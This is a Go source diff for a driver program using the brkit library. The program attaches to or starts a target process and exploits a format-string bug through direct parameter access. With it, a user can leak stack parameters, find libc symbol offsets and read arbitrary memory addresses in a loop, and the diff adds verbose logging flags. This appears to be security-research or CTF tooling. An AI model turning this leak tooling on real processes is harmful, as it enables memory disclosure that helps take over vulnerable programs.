@@ -7,17 +7,30 @@ import (
 	"log"
 	"os"
 	"os/exec"
-	"strconv"
 	"strings"
 
 	"github.com/stephen-fox/brkit/memory"
 	"github.com/stephen-fox/brkit/process"
 )
 
+var (
+	verbose    *log.Logger
+	muyVerbose *log.Logger
+)
+
 func main() {
-	verbose := flag.Bool("v", false, "Verbose output")
+	isVerbose := flag.Bool("v", false, "Verbose output")
+	isMuyVerbose := flag.Bool("vv", false, "Muy verbose output")
 
 	flag.Parse()
+
+	if *isVerbose {
+		verbose = log.New(log.Writer(), log.Prefix(), log.Flags())
+	}
+
+	if *isMuyVerbose {
+		muyVerbose = log.New(log.Writer(), log.Prefix(), log.Flags())
+	}
 
 	var proc *process.Process
 	if strings.Contains(flag.Arg(0), ":") {
@@ -27,12 +40,9 @@ func main() {
 		proc = process.StartOrExit(cmd)
 		log.Printf("pid: %d", cmd.Process.Pid)
 	}
+	proc.SetLogger(muyVerbose)
 
-	if *verbose {
-		proc.SetLogger(log.New(log.Writer(), log.Prefix(), log.Flags()))
-	}
-
-	leakParams(proc)
+	leakMemoryAtLoop(proc)
 }
 
 func leakParams(proc *process.Process) {
@@ -42,8 +52,12 @@ func leakParams(proc *process.Process) {
 		},
 		MaxNumParams: 200,
 		PointerSize:  8,
-		//Verbose:      log.New(log.Writer(), log.Prefix(), log.Flags()),
+		Verbose:      muyVerbose,
 	})
+
+	if verbose != nil {
+		verbose.Printf("format string is '%s'", leaker.FormatString())
+	}
 
 	log.Printf("press enter when ready")
 	fmt.Scanln()
@@ -66,8 +80,12 @@ func leakLocalLibcSymbolParamNumbers(proc *process.Process) {
 		},
 		MaxNumParams: 200,
 		PointerSize:  8,
-		//Verbose:      log.New(log.Writer(), log.Prefix(), log.Flags()),
+		Verbose:      muyVerbose,
 	})
+
+	if verbose != nil {
+		verbose.Printf("format string is '%s'", leaker.FormatString())
+	}
 
 	for {
 		log.Printf("please enter a target to find followed by 'enter':\n")
@@ -86,30 +104,36 @@ func leakLocalLibcSymbolParamNumbers(proc *process.Process) {
 	}
 }
 
-func leakMemoryAt(proc *process.Process) {
+func leakMemoryAtLoop(proc *process.Process) {
 	leaker := memory.SetupFormatStringLeakViaDPAOrExit(memory.FormatStringDPAConfig{
 		ProcessIOFn: func() memory.ProcessIO {
 			return proc
 		},
 		MaxNumParams: 200,
 		PointerSize:  8,
+		Verbose:      muyVerbose,
 	})
 
-	log.Printf("please enter a memory address to read from followed by 'enter':\n")
-	pointerStr, err := bufio.NewReader(os.Stdin).ReadString('\n')
-	if err != nil {
-		log.Fatalln(err)
+	if verbose != nil {
+		verbose.Printf("format string is '%s'", leaker.FormatString())
 	}
 
-	pointerStr = strings.TrimPrefix(pointerStr[0:len(pointerStr)-1], "0x")
-	log.Printf("parsed pointer as '%s'", pointerStr)
+	for {
+		log.Printf("please enter a memory address to read from followed by 'enter':\n")
+		pointerStr, err := bufio.NewReader(os.Stdin).ReadString('\n')
+		if err != nil {
+			log.Fatalln(err)
+		}
 
-	pointer, err := strconv.ParseUint(pointerStr, 16, 64)
-	if err != nil {
-		log.Fatalln(err)
+		pointer := memory.HexStringToPointerOrExit(
+			pointerStr[0:len(pointerStr)-1],
+			memory.PointerMakerForX86(),
+			64)
+
+		log.Printf("parsed pointer as '%s' (0x%x)", pointer.HexString(), pointer)
+
+		raw := leaker.MemoryAtOrExit(pointer)
+
+		log.Printf("read: 0x%x", raw)
 	}
-
-	raw := leaker.MemoryAtOrExit(memory.PointerMakerForX86().U64(pointer))
-
-	log.Printf("read: 0x%x", raw)
 }
